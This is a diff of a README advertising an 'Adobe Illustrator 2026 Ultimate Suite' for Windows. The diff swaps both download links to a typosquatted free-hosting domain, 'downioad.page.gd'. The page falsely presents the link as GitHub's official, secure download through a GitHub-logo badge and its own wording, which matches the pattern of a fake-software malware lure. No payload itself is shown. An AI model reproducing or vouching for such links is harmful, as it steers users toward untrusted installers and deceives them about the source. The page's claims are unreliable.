@@ -2,7 +2,7 @@
 
 Adobe Illustrator 2026 Ultimate Suite is a comprehensive pack of tools, plugins, and effects that seamlessly integrate with Adobe Illustrator to elevate your design capabilities. This package is designed for Windows users looking to enhance their productivity and creativity in 2026. Whether you're a professional designer or a hobbyist, this suite offers a range of features to streamline your workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ A4: Updates are typically released quarterly to include new features, compatibil
 
 To get started with the Adobe Illustrator 2026 Ultimate Suite, download the installer from the official page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides access to the most current and secure version of the suite. Ensure you download only from trusted sources to avoid any issues.
 
